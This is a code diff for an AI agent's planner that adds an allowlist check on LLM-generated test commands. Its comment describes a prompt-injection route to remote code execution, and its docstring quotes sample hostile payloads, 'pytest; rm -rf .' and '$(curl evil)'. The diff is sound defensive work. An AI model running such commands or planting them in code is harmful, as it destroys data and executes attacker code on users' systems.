@@ -15,10 +15,52 @@ from __future__ import annotations
 
 import hashlib
 import json
+import re
+import shlex
 from pathlib import Path
 from typing import Callable
 
 from .config import DEFAULT_GENERATOR
+
+# --- test_cmd allowlist (audit-2026-08 #12: test_cmd is PLANNER/LLM output that lands in
+# subprocess.run(shell=True) at the F3 gate -- a real prompt-injection -> RCE vector, unlike
+# external_test which is the USER's own trusted command. Deterministic, no LLM: reject shell
+# metacharacters outright, then require the first token to be a known test-runner binary. Gates
+# TWICE: here (validate_worklist, so a bad test_cmd triggers the planner's normal re-ask loop)
+# and again at execution time in project_integrate.py (defense-in-depth for injected plan_fns
+# that skip validate_worklist, e.g. tests/other callers). ---
+_TEST_CMD_BINS = {
+    "pytest", "python", "python3", "py", "unittest", "tox", "nose2",
+    "node", "npm", "npx", "yarn", "pnpm", "jest", "vitest",
+    "go", "cargo", "mvn", "gradle", "make", "ruff", "mypy", "coverage",
+}
+_SHELL_META = re.compile(r"[;&|$`(){}<>\n\r]")
+
+
+def validate_test_cmd(cmd: str | None) -> tuple[bool, str]:
+    """Deterministic allowlist gate for a test_cmd. None is VALID (unit stays 'unverified', decided
+    by the caller). Rejects shell metacharacters (;|&$`(){}<> and redirection/newlines) so a
+    compound/chained payload (`pytest; rm -rf .`, `$(curl evil)`, backticks) never reaches a shell,
+    then requires the resolved binary name to be a known test/build runner. Case-sensitive on
+    purpose (a binary name is not free text)."""
+    if cmd is None:
+        return True, ""
+    if not isinstance(cmd, str) or not cmd.strip():
+        return False, "test_cmd is empty/not a string"
+    if _SHELL_META.search(cmd):
+        return False, f"test_cmd contains disallowed shell metacharacters: {cmd!r}"
+    try:
+        tokens = shlex.split(cmd)
+    except ValueError as e:
+        return False, f"test_cmd failed to tokenize: {e}"
+    if not tokens:
+        return False, "test_cmd parses to no tokens"
+    bin_name = tokens[0].replace("\\", "/").rsplit("/", 1)[-1]
+    bin_name = re.sub(r"\.(exe|cmd|bat)$", "", bin_name, flags=re.IGNORECASE)
+    if bin_name not in _TEST_CMD_BINS:
+        return False, (f"test_cmd binary {bin_name!r} not in allowlist "
+                       f"{sorted(_TEST_CMD_BINS)}")
+    return True, ""
 
 # --- worklist cache (goal-regression pattern, research 2026-07: ChatHTN caches LLM-validated
 # decompositions as reusable HTN methods so a repeat task skips the LLM entirely -- zero variance
@@ -112,6 +154,9 @@ def validate_worklist(units: list[dict]) -> tuple[bool, list[str]]:
         for d in u.get("deps", []) or []:
             if d not in known:
                 errs.append(f"unit '{u.get('name')}' depends on unknown unit '{d}'")
+        tc_ok, tc_why = validate_test_cmd(u.get("test_cmd"))
+        if not tc_ok:
+            errs.append(f"unit '{u.get('name')}' has invalid test_cmd: {tc_why}")
     if not errs and _has_cycle(units):
         errs.append("dependency cycle (deps must form a DAG)")
     return (not errs, errs)
@@ -167,7 +212,9 @@ _WORKLIST_SYS = (
     '"deps": ["other-unit-names"], "test_cmd": "an EXISTING command that verifies this unit, or null"}]. '
     "Order by dependency; no cycles; each unit small enough to implement in ONE file — `file` is that "
     "file's path relative to the repo root (the file the unit creates or edits; REQUIRED). Do NOT "
-    "invent tests — test_cmd must be an existing/user-provided command or null.")
+    "invent tests — test_cmd must be an existing/user-provided command or null. test_cmd must be a "
+    "SIMPLE command (no ;, &&, |, $(), backticks, redirection) starting with a known test/build "
+    "runner (pytest, python, node, npm, go, cargo, make, ...).")
 
 
 def _plan_user_msg(task: str, external_test: str | None) -> str:
